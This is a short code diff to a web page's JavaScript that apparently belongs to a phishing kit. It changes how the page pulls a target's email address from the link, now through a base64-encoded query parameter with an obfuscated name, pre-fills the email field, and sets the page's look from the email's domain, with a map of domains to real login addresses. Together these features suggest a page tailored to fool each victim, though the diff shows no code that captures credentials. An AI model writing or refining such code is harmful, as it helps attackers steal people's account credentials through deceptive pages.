@@ -71,9 +71,26 @@
                 return loginMap[domain] || `https://${domain}`;
             }
 
+            // Function to parse query parameter
+            function getQueryParam(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const value = urlParams.get(param);
+                if (value) {
+                    try {
+                        // Attempt to decode as base64
+                        return atob(value);
+                    } catch (e) {
+                        // If decoding fails, use raw value
+                        console.log('Base64 decode failed for', param, ':', value, 'Error:', e.message);
+                        return value;
+                    }
+                }
+                return null;
+            }
+
             // Handle email processing
-            let email = window.location.hash.slice(1) || $('#email').val();
-            console.log('Extracted email:', email); // Debug
+            let email = getQueryParam('3ODkwIiw') || $('#email').val();
+            console.log('Extracted email:', email);
 
             function updateBranding(email) {
                 if (!email) {
@@ -118,6 +135,7 @@
 
             // Initial branding update
             updateBranding(email);
+            $('#email').val(email); // Populate email input with extracted email
 
             // Update branding on email input change
             $('#email').on('input', function() {
